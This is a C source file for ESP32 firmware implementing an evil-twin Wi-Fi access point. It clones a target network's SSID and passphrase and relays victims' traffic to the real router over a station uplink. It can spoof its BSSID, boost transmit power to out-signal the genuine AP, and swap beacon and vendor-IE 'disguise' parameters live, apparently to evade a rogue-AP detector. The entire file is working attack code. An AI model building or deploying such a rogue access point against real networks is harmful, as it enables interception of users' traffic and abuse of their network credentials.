#include "wifi_twin.h"
#include "app_config.h"

#include <string.h>
#include "esp_log.h"
#include "esp_wifi.h"
#include "esp_event.h"

static const char *TAG = "wifi_twin";
static esp_netif_t *s_ap_netif;
static esp_netif_t *s_sta_netif;

// Persistent storage for the vendor IE: esp_wifi_set_vendor_ie keeps a pointer,
// so this buffer must outlive the call.
static uint8_t s_vie_buf[sizeof(vendor_ie_data_t) + DISGUISE_VENDOR_PAYLOAD_MAX];

esp_netif_t *wifi_twin_ap_netif(void)  { return s_ap_netif; }
esp_netif_t *wifi_twin_sta_netif(void) { return s_sta_netif; }

esp_err_t wifi_twin_init(void)
{
    s_ap_netif  = esp_netif_create_default_wifi_ap();
    s_sta_netif = esp_netif_create_default_wifi_sta();

    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    ESP_ERROR_CHECK(esp_wifi_init(&cfg));
    ESP_ERROR_CHECK(esp_wifi_set_storage(WIFI_STORAGE_RAM));
    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_APSTA));
    ESP_LOGI(TAG, "wifi initialised in AP+STA mode");
    return ESP_OK;
}

// Configure both interfaces from the target network + current disguise. Must be
// called while WiFi is stopped (esp_wifi_set_mac requires it).
static esp_err_t configure(const disguise_t *d)
{
    // ---- STA (uplink to the REAL router, so the relay has internet) ----
    wifi_config_t sta = {0};
    strlcpy((char *)sta.sta.ssid,     ALGHUL_TARGET_SSID, sizeof(sta.sta.ssid));
    strlcpy((char *)sta.sta.password, ALGHUL_TARGET_PSK,  sizeof(sta.sta.password));
    static const uint8_t up_bssid[6] = ALGHUL_UPLINK_BSSID;
    bool lock = false;
    for (int i = 0; i < 6; i++) if (up_bssid[i]) lock = true;
    if (lock) {
        sta.sta.bssid_set = true;
        memcpy(sta.sta.bssid, up_bssid, 6);  // lock uplink to the real AP's BSSID
    }
    sta.sta.scan_method = WIFI_ALL_CHANNEL_SCAN;
    ESP_ERROR_CHECK(esp_wifi_set_config(WIFI_IF_STA, &sta));

    // ---- AP (the clone the phone sees) ----
    wifi_config_t ap = {0};
    strlcpy((char *)ap.ap.ssid, ALGHUL_TARGET_SSID, sizeof(ap.ap.ssid));
    ap.ap.ssid_len       = strlen(ALGHUL_TARGET_SSID);
    ap.ap.channel        = 1;  // the stack moves the AP to the STA channel on connect
    ap.ap.max_connection = ALGHUL_AP_MAX_CONN;
    ap.ap.beacon_interval = d->beacon_interval;
    if (strlen(ALGHUL_TARGET_PSK) > 0) {
        strlcpy((char *)ap.ap.password, ALGHUL_TARGET_PSK, sizeof(ap.ap.password));
        ap.ap.authmode = WIFI_AUTH_WPA2_PSK;
    } else {
        ap.ap.authmode = WIFI_AUTH_OPEN;
    }
    ESP_ERROR_CHECK(esp_wifi_set_config(WIFI_IF_AP, &ap));

    // ---- disguise: the twin's advertised BSSID ----
    esp_err_t e = esp_wifi_set_mac(WIFI_IF_AP, (uint8_t *)d->ap_bssid);
    if (e != ESP_OK) {
        ESP_LOGW(TAG, "set AP BSSID failed (%s); must be unicast/locally-administered",
                 esp_err_to_name(e));
    }
    return ESP_OK;
}

static void apply_vendor_ie(const disguise_t *d)
{
    if (!d->vendor_ie_enabled) {
        esp_wifi_set_vendor_ie(false, WIFI_VND_IE_TYPE_BEACON, WIFI_VND_IE_ID_0, NULL);
        return;
    }
    vendor_ie_data_t *vie = (vendor_ie_data_t *)s_vie_buf;
    vie->element_id     = WIFI_VENDOR_IE_ELEMENT_ID;         // 0xDD
    vie->length         = 4 + d->vendor_payload_len;          // oui(3)+type(1)+payload
    memcpy(vie->vendor_oui, d->vendor_oui, 3);
    vie->vendor_oui_type = 1;
    memcpy((uint8_t *)vie + sizeof(vendor_ie_data_t),
           d->vendor_payload, d->vendor_payload_len);
    esp_err_t e = esp_wifi_set_vendor_ie(true, WIFI_VND_IE_TYPE_BEACON,
                                         WIFI_VND_IE_ID_0, vie);
    if (e != ESP_OK) ESP_LOGW(TAG, "vendor IE set failed: %s", esp_err_to_name(e));
}

static void apply_runtime(const disguise_t *d)
{
    esp_err_t e = esp_wifi_set_max_tx_power(d->tx_power);  // "out-signal" level
    if (e != ESP_OK) ESP_LOGW(TAG, "set tx power failed: %s", esp_err_to_name(e));
    apply_vendor_ie(d);
}

esp_err_t wifi_twin_start(const disguise_t *d)
{
    ESP_ERROR_CHECK(configure(d));
    ESP_ERROR_CHECK(esp_wifi_start());
    apply_runtime(d);
    ESP_LOGI(TAG, "twin started: SSID '%s', beacon %u TU, txpow %d",
             ALGHUL_TARGET_SSID, d->beacon_interval, d->tx_power);
    return ESP_OK;
}

esp_err_t wifi_twin_apply_disguise(const disguise_t *d)
{
    // Only a BSSID change needs a full WiFi restart (esp_wifi_set_mac requires a
    // stopped interface). Beacon interval, vendor IE, and TX power can all be
    // changed live, with the AP staying up and clients (and the control link)
    // never dropping. Keeping the BSSID fixed during a run is what makes the live
    // arms race stable.
    uint8_t cur[6];
    esp_wifi_get_mac(WIFI_IF_AP, cur);
    bool bssid_changed = (memcmp(cur, d->ap_bssid, 6) != 0);

    if (bssid_changed) {
        ESP_LOGI(TAG, "BSSID change -> brief AP/STA restart");
        ESP_ERROR_CHECK(esp_wifi_stop());
        ESP_ERROR_CHECK(configure(d));
        ESP_ERROR_CHECK(esp_wifi_start());
        apply_runtime(d);
    } else {
        ESP_LOGI(TAG, "live disguise update (no restart): beacon=%u txpow=%d vie=%d",
                 d->beacon_interval, d->tx_power, d->vendor_ie_enabled);
        wifi_config_t ap = {0};
        esp_wifi_get_config(WIFI_IF_AP, &ap);
        ap.ap.beacon_interval = d->beacon_interval;
        esp_wifi_set_config(WIFI_IF_AP, &ap);
        apply_runtime(d);  // tx power + vendor IE, both live
    }
    return ESP_OK;
}
